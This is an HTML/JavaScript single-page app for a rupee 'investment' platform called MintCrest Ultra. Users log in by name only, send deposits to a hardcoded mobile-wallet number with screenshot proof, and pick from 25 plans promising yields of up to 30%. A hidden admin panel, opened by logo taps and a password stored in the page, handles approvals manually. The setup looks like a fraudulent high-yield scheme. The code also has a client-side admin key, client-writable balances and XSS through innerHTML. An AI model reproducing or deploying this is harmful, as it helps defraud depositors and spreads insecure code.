<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Ultra | V16 Pro</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow: hidden; }
        
        /* Neon Colors & Backgrounds */
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #0062ff 0%, #00d4ff 100%); }
        .grad-gold { background: linear-gradient(135deg, #ff930f 0%, #fff95b 100%); }
        .grad-rose { background: linear-gradient(135deg, #ff0055 0%, #ff5500 100%); }
        .grad-purple { background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); }
        
        /* Mobile Optimization */
        .page { display: none; height: 100%; overflow-y: auto; padding-bottom: 120px; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .nav-btn { transition: 0.3s; filter: grayscale(1); opacity: 0.5; }
        .active-tab { filter: grayscale(0); opacity: 1; transform: translateY(-5px); color: #00d4ff; }
        
        input { border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
        input:focus { border-color: #00d4ff; box-shadow: 0 0 10px rgba(0,212,255,0.3); }
        
        .promo-glow { animation: glow 2s infinite; }
        @keyframes glow { 0%, 100% { box-shadow: 0 0 5px #ff930f; } 50% { box-shadow: 0 0 20px #ff930f; } }
    </style>
</head>
<body class="h-screen flex flex-col">
    <div id="ticker-wrap" class="hidden bg-blue-600/20 py-2 border-b border-white/10 z-[500] backdrop-blur-md">
        <div class="marquee text-[10px] font-black uppercase tracking-widest text-cyan-400">
             ⚡ <span id="ticker-text">Welcome to MintCrest Ultra - Smart Investing Starts Here</span> ⚡
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8">
        <div class="w-24 h-24 grad-main rounded-3xl mb-6 rotate-12 shadow-[0_0_50px_rgba(0,98,255,0.5)]"></div>
        <h1 onclick="adminTap()" class="text-4xl font-black tracking-tighter mb-8 uppercase italic">MINTCREST</h1>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs text-center">
            <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-4 rounded-2xl mb-4 text-center font-bold outline-none">
            <button onclick="login()" class="w-full grad-main py-4 rounded-2xl font-black text-xs uppercase shadow-lg active:scale-95 transition-all">Enter Dashboard</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 relative">
        <div id="p-home" class="page active-page p-6">
            <div class="grad-main p-8 rounded-[3rem] mb-6 shadow-2xl relative overflow-hidden">
                <div class="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 blur-3xl"></div>
                <p class="text-[10px] font-black opacity-80 uppercase mb-1">Available Capital</p>
                <h2 class="text-5xl font-extrabold tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-8 flex justify-between items-center">
                    <div class="glass bg-white/10 px-4 py-2 rounded-2xl">
                        <p class="text-[8px] uppercase opacity-60">Today's Profit</p>
                        <p class="text-sm font-black" id="v-profit">₨ 0</p>
                    </div>
                    <button onclick="requestBonus()" class="grad-gold text-black px-6 py-3 rounded-2xl text-[10px] font-black uppercase shadow-lg">🎁 Bonus</button>
                </div>
            </div>

            <div class="glass p-6 rounded-[2.5rem] mb-6 border-2 border-yellow-500/20 promo-glow">
                <h3 class="text-[10px] font-black uppercase text-yellow-500 mb-3">Redeem Promo Code</h3>
                <div class="flex gap-2">
                    <input type="text" id="promo-input" placeholder="Enter Code" class="flex-1 bg-white/5 p-3 rounded-xl text-xs font-bold uppercase">
                    <button onclick="applyPromo()" class="grad-gold text-black px-4 rounded-xl text-[10px] font-black uppercase">Apply</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="changePage('wallet')" class="glass p-6 rounded-[2.5rem] flex flex-col items-center">
                    <span class="text-2xl mb-2">💎</span>
                    <span class="text-[10px] font-black uppercase text-cyan-400">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-6 rounded-[2.5rem] flex flex-col items-center">
                    <span class="text-2xl mb-2">💸</span>
                    <span class="text-[10px] font-black uppercase text-rose-500">Withdraw</span>
                </button>
            </div>

            <div class="glass p-6 rounded-[3rem]">
                <h3 class="text-[10px] font-black uppercase mb-4 text-blue-400">Community Support</h3>
                <div id="sec-msg" class="h-48 overflow-y-auto space-y-3 mb-4 text-[10px]"></div>
                <div class="flex gap-2">
                    <input type="text" id="chat-inp" placeholder="Type here..." class="flex-1 bg-white/5 p-3 rounded-2xl text-xs outline-none">
                    <button onclick="sendMsg()" class="grad-main p-3 rounded-2xl">✈️</button>
                </div>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] text-center">
                <h3 class="font-black text-cyan-400 mb-6 uppercase italic">Funding Terminal</h3>
                <div class="bg-cyan-500/10 p-4 rounded-2xl text-[11px] font-black mb-6 border border-cyan-500/20">
                    <p class="opacity-60 text-[9px] mb-1">TRANSFER TO JAZZ/EASY</p>
                    <p class="text-lg">03705519562</p>
                </div>
                <input type="number" id="dep-amount" placeholder="Enter Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold">
                <input type="text" id="dep-trx" placeholder="TID Number" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold uppercase">
                <div class="text-left mb-6">
                    <p class="text-[9px] font-black text-cyan-400 mb-2 uppercase italic">Proof Screenshot:</p>
                    <input type="file" id="dep-proof" accept="image/*" class="w-full text-[10px] glass p-3 rounded-xl">
                </div>
                <button id="btn-dep" onclick="submitDeposit()" class="w-full grad-main py-5 rounded-3xl font-black text-xs uppercase">Confirm Payment</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
             <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-rose-600">
                <h3 class="font-black text-rose-500 mb-6 uppercase">Liquidation</h3>
                <input type="number" id="wd-amt" placeholder="Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold">
                <input type="text" id="wd-acc" placeholder="Account Title & No" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-xs font-bold">
                <button onclick="submitWithdraw()" class="w-full grad-rose py-5 rounded-3xl font-black text-xs uppercase shadow-xl">Process Withdrawal</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-3"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-3"></div></div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[5000] hidden overflow-y-auto p-6">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
            <h2 class="text-xl font-black text-cyan-400 uppercase italic">Command Node</h2>
            <button onclick="closeAdmin()" class="bg-rose-600 px-6 py-2 rounded-xl text-[10px] font-black uppercase">Exit</button>
        </div>
        <div id="adm-sec-requests" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-6 flex justify-around items-center fixed bottom-0 w-full z-[200] rounded-t-[3rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="nav-btn active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('wallet')" id="n-wallet" class="nav-btn text-2xl">📥</button>
    </nav>
        <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.appspot.com", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        // 25 Mobile-Friendly Plans
        const plans = [
            { n: "Standard 01", p: 100, r: 2 }, { n: "Standard 02", p: 300, r: 2.2 },
            { n: "Standard 03", p: 500, r: 2.5 }, { n: "Standard 04", p: 800, r: 2.8 },
            { n: "Standard 05", p: 1000, r: 3.1 }, { n: "Standard 06", p: 1500, r: 3.4 },
            { n: "Standard 07", p: 2000, r: 3.7 }, { n: "Standard 08", p: 3000, r: 4 },
            { n: "Standard 09", p: 4000, r: 4.3 }, { n: "Standard 10", p: 5000, r: 4.6 },
            { n: "Elite 11", p: 6500, r: 5 }, { n: "Elite 12", p: 8000, r: 5.5 },
            { n: "Elite 13", p: 10000, r: 6 }, { n: "Elite 14", p: 12000, r: 6.5 },
            { n: "Elite 15", p: 15000, r: 7 }, { n: "Master 16", p: 20000, r: 7.5 },
            { n: "Master 17", p: 25000, r: 8 }, { n: "Master 18", p: 30000, r: 8.5 },
            { n: "Master 19", p: 40000, r: 9 }, { n: "Vanguard 20", p: 50000, r: 10 },
            { n: "⚡ FLASH A", p: 200, r: 15, f: true }, { n: "⚡ FLASH B", p: 500, r: 18, f: true },
            { n: "🚀 ROCKET", p: 5000, r: 22, f: true }, { n: "🔥 TURBO", p: 10000, r: 25, f: true },
            { n: "👑 CROWN", p: 25000, r: 30, f: true }
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now() });
            startSync(name); document.getElementById('auth-ui').style.display='none'; 
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); listenMsgs(); listenNews();
        }

        // PROMO CODE LOGIC
        async function applyPromo() {
            const code = document.getElementById('promo-input').value.toUpperCase();
            if(!code) return alert("Sweetie, enter a code first!");
            const ref = db.collection("promos").doc(code);
            const doc = await ref.get();
            if(doc.exists && !doc.data().usedBy?.includes(user.name)) {
                const prize = doc.data().amount;
                await db.collection("users").doc(user.name).update({ 
                    balance: (user.balance || 0) + prize,
                    usedBy: firebase.firestore.FieldValue.arrayUnion(user.name) 
                });
                alert("🎉 Success! ₨ " + prize + " added to your vault!");
                document.getElementById('promo-input').value = '';
            } else { alert("Invalid or already used code! ❌"); }
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); } });
            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-[1.5rem] flex justify-between items-center mb-2 text-[10px] font-black uppercase"><div>${d.type}</div><div class="text-right">₨ ${d.amount}<br><span class="status-badge badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const file = document.getElementById('dep-proof').files[0];
            if(!a || !t || !file) return alert("Complete all steps, sweetie! 😘");
            const btn = document.getElementById('btn-dep'); btn.innerText = "⚡ SYNCING..."; btn.disabled = true;
            try {
                const storageRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await storageRef.put(file);
                const url = await storageRef.getDownloadURL();
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "deposit", status: "pending", time: Date.now() });
                alert("Request Logged!"); location.reload();
            } catch (e) { alert("Sync Error!"); btn.innerText = "Confirm Payment"; btn.disabled = false; }
        }

        async function submitWithdraw() {
            const a = parseInt(document.getElementById('wd-amt').value); const acc = document.getElementById('wd-acc').value; if(!a || a > user.balance) return alert("Insufficient Capital!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            alert("Liquidation Initiated!"); location.reload();
        }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Auth Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    list.innerHTML += `<div class="glass p-5 rounded-3xl mb-4">
                        <div class="flex justify-between text-[11px] font-black uppercase mb-1"><span>${d.user}</span><span>₨ ${d.amount}</span></div>
                        <p class="text-[8px] opacity-50 mb-3">${d.type} | ${d.tid||d.acc||''}</p>
                        ${d.proof ? `<a href="${d.proof}" target="_blank" class="block bg-cyan-600 text-center py-2 rounded-xl text-[10px] font-black mb-3">VIEW PROOF</a>` : ''}
                        <div class="flex gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="flex-1 grad-main py-3 rounded-xl text-[9px] font-black">APPROVE</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="flex-1 bg-rose-600 py-3 rounded-xl text-[9px] font-black">REJECT</button></div>
                    </div>`;
                });
            });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(act==='approved') {
                if(type.includes('Bonus')) { const b = parseInt(prompt("Bonus Amount:")); await ref.update({ balance: (doc.data().balance||0) + b }); }
                else if(type==='deposit') await ref.update({ balance: (doc.data().balance||0) + amt });
            } else if(act==='rejected' && type==='withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act }); 
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { const cls = p.f ? 'grad-purple' : 'glass'; list.innerHTML += `<div class="${cls} p-6 rounded-[2rem] flex justify-between items-center shadow-lg"><div class="text-left"><h4 class="font-black text-[11px] uppercase">${p.n}</h4><p class="text-[8px] opacity-70">${p.r}% Yield</p></div><div class="font-black text-xs">₨ ${p.p}</div></div>`; });
        }
        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); 
            document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab'));
            document.getElementById('p-'+p).classList.add('active-page'); 
            document.getElementById('n-'+p).classList.add('active-tab');
        }
        async function sendMsg() { const m = document.getElementById('chat-inp').value; if(m) { await db.collection("chat").add({ user: user.name, message: m, time: Date.now() }); document.getElementById('chat-inp').value=''; } }
        function listenMsgs() { db.collection("chat").orderBy("time", "asc").limitToLast(10).onSnapshot(snap => { const list = document.getElementById('sec-msg'); list.innerHTML=''; snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-3 rounded-2xl"><p class="text-cyan-400 uppercase text-[8px]">${d.user}</p><p class="mt-1">${d.message}</p></div>`; }); }); }
        function listenNews() { db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) { document.getElementById('ticker-wrap').classList.remove('hidden'); document.getElementById('ticker-text').innerText = doc.data().message; } }); }
        async function requestBonus() { await db.collection("requests").add({ user: user.name, amount: 0, type: "Bonus Request", status: "pending", time: Date.now() }); alert("Sent!"); }
    </script>
</body>
</html>
